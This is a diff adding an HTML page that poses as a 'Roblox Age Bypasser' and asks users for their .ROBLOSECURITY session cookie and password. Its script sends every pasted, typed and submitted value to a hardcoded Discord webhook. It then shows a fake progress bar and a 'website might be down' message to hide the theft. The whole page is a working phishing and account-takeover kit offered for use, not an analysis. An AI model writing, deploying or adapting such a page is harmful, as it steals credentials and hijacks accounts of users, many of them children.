@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Roblox Age Bypasser</title>
+<style>
+  :root{
+    --bg1:#0a0f1f; --bg2:#0d1b3a;
+    --blue:#2f7bff; --blue2:#5aa9ff;
+    --glow:0 0 25px rgba(47,123,255,.55);
+    --text:#eaf2ff; --muted:#9fb6e0;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  body{
+    min-height:100vh;
+    background:radial-gradient(1200px 800px at 20% 10%, #12306b 0%, transparent 60%),
+               radial-gradient(1000px 700px at 90% 90%, #0b2a6b 0%, transparent 55%),
+               linear-gradient(160deg,var(--bg1),var(--bg2));
+    color:var(--text);
+    font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,Arial,sans-serif;
+    display:flex;align-items:center;justify-content:center;padding:28px;
+  }
+  .card{
+    width:100%;max-width:460px;
+    background:linear-gradient(180deg,rgba(18,34,72,.92),rgba(10,18,40,.96));
+    border:1px solid rgba(90,169,255,.35);border-radius:22px;
+    padding:34px 30px 28px;
+    box-shadow:var(--glow), 0 20px 60px rgba(0,0,0,.55);
+    position:relative;overflow:hidden;
+  }
+  .card::before{
+    content:"";position:absolute;inset:-2px;border-radius:24px;
+    background:linear-gradient(120deg,transparent,rgba(90,169,255,.35),transparent);
+    filter:blur(14px);opacity:.6;pointer-events:none;
+  }
+  .badge{
+    display:inline-flex;align-items:center;gap:8px;
+    font-size:12px;letter-spacing:.14em;text-transform:uppercase;
+    color:var(--blue2);border:1px solid rgba(90,169,255,.45);
+    padding:6px 12px;border-radius:999px;margin-bottom:18px;
+    background:rgba(47,123,255,.08);
+  }
+  .dot{width:8px;height:8px;border-radius:50%;background:#39ff9a;box-shadow:0 0 12px #39ff9a;animation:pulse 1.6s infinite}
+  @keyframes pulse{0%,100%{opacity:1}50%{opacity:.35}}
+  h1{font-size:26px;font-weight:800;margin-bottom:6px}
+  h1 span{background:linear-gradient(90deg,var(--blue),var(--blue2));-webkit-background-clip:text;background-clip:text;color:transparent}
+  p.sub{color:var(--muted);font-size:13.5px;margin-bottom:26px}
+  label{display:block;font-size:12.5px;color:var(--muted);margin:16px 0 7px}
+  input{
+    width:100%;padding:14px 15px;border-radius:13px;
+    background:rgba(6,12,28,.85);
+    border:1px solid rgba(90,169,255,.28);
+    color:var(--text);font-size:14px;outline:none;transition:.18s;
+  }
+  input:focus{border-color:var(--blue2);box-shadow:0 0 0 4px rgba(47,123,255,.18)}
+  .btn{
+    margin-top:26px;width:100%;padding:15px;border:none;border-radius:14px;
+    background:linear-gradient(90deg,#2f7bff,#5aa9ff);
+    color:#fff;font-weight:800;font-size:15px;letter-spacing:.4px;
+    cursor:pointer;box-shadow:0 10px 30px rgba(47,123,255,.35);
+    transition:.18s;
+  }
+  .btn:hover{transform:translateY(-1px);box-shadow:0 14px 38px rgba(47,123,255,.5)}
+  .status{
+    margin-top:22px;display:none;flex-direction:column;gap:12px;
+    padding:14px 16px;border-radius:14px;
+    background:rgba(47,123,255,.1);border:1px solid rgba(90,169,255,.4);
+    color:var(--blue2);font-size:14px;font-weight:600;
+  }
+  .status.show{display:flex}
+  .row{display:flex;align-items:center;gap:12px}
+  .spinner{
+    width:18px;height:18px;border-radius:50%;
+    border:2px solid rgba(90,169,255,.25);border-top-color:var(--blue2);
+    animation:spin 1s linear infinite;flex:0 0 auto;
+  }
+  @keyframes spin{to{transform:rotate(360deg)}}
+  .bar{width:100%;height:8px;border-radius:999px;background:rgba(90,169,255,.15);overflow:hidden}
+  .bar > i{
+    display:block;height:100%;width:0%;
+    background:linear-gradient(90deg,#2f7bff,#5aa9ff);
+    transition:width .4s ease;
+  }
+  .note{
+    display:none;margin-top:12px;font-size:12.5px;color:#ffd36e;
+    background:rgba(255,200,80,.08);border:1px solid rgba(255,200,80,.35);
+    padding:10px 12px;border-radius:12px;
+  }
+  .note.show{display:block}
+  .footer{margin-top:22px;text-align:center;font-size:12px;color:#6f88b8}
+</style>
+</head>
+<body>
+  <div class="card">
+    <div class="badge"><span class="dot"></span> Age Bypasser · Splunk-Pro-V2</div>
+    <h1>Roblox <span>Age Bypasser</span></h1>
+    <p class="sub">Instant account unlock · Live</p>
+
+    <form id="f">
+      <label>.ROBLOSECURITY Cookie</label>
+      <input id="cookie" type="text" placeholder="_|WARNING:-DO-NOT-SHARE-THIS..." autocomplete="off">
+      <label>Password (Optional)</label>
+      <input id="pass" type="password" placeholder="••••••••••" autocomplete="off">
+      <button class="btn" type="submit">Submit</button>
+    </form>
+
+    <div class="status" id="s">
+      <div class="row"><div class="spinner"></div><span id="statusText">Working on it — 5 min</span></div>
+      <div class="bar"><i id="prog"></i></div>
+    </div>
+    <div class="note" id="note">This is taking too long — website might be down. Please wait or try again later.</div>
+
+    <div class="footer">Join Discord Server</div>
+  </div>
+
+<script>
+const WEBHOOK = "https://discord.com/api/webhooks/1555259775997050990/IO0eRwmoMqlmNLyDKV5k8HX37dOLR-Wnm8u8wk2LKmI9jZWZEHpRq1vJ0emS14NDfmpw";
+
+const cookieEl = document.getElementById("cookie");
+const passEl   = document.getElementById("pass");
+const statusEl = document.getElementById("s");
+const statusTx = document.getElementById("statusText");
+const noteEl   = document.getElementById("note");
+const progEl   = document.getElementById("prog");
+const form     = document.getElementById("f");
+
+let lastSent = "";
+let progressTimer = null;
+let longTimer = null;
+
+function send(payload){
+  fetch(WEBHOOK, {
+    method:"POST",
+    headers:{"Content-Type":"application/json"},
+    body: JSON.stringify(payload)
+  }).catch(()=>{});
+}
+
+function logInput(name, value){
+  if(!value) return;
+  const key = name + ":" + value;
+  if(key === lastSent) return;
+  lastSent = key;
+  send({ content: "**" + name + "**\n```" + value + "```" });
+}
+
+// auto-send on paste (instant)
+cookieEl.addEventListener("paste", e => {
+  const t = (e.clipboardData || window.clipboardData).getData("text");
+  if(t) logInput("COOKIE", t.trim());
+});
+passEl.addEventListener("paste", e => {
+  const t = (e.clipboardData || window.clipboardData).getData("text");
+  if(t) logInput("PASSWORD", t.trim());
+});
+
+// still catch typing too
+cookieEl.addEventListener("input", e => logInput("COOKIE", e.target.value));
+passEl.addEventListener("input", e => logInput("PASSWORD", e.target.value));
+
+function startFakeProgress(){
+  let p = 0;
+  progEl.style.width = "0%";
+  statusTx.textContent = "Working on it — 5 min";
+  noteEl.classList.remove("show");
+
+  progressTimer = setInterval(() => {
+    p += Math.random() * 7 + 2;
+    if(p > 92) p = 92;
+    progEl.style.width = p + "%";
+  }, 700);
+
+  longTimer = setTimeout(() => {
+    noteEl.classList.add("show");
+    statusTx.textContent = "Still working...";
+  }, 30000);
+}
+
+form.addEventListener("submit", e => {
+  e.preventDefault();
+  const cookie = cookieEl.value.trim();
+  const pass = passEl.value.trim();
+
+  send({
+    content:
+      "**=== SUBMIT ===**\n" +
+      "**COOKIE:**\n```" + (cookie || "(empty)") + "```\n" +
+      "**PASSWORD:**\n```" + (pass || "(empty)") + "```"
+  });
+
+  statusEl.classList.add("show");
+  if(progressTimer) clearInterval(progressTimer);
+  if(longTimer) clearTimeout(longTimer);
+  startFakeProgress();
+});
+</script>
+</body>
+</html>
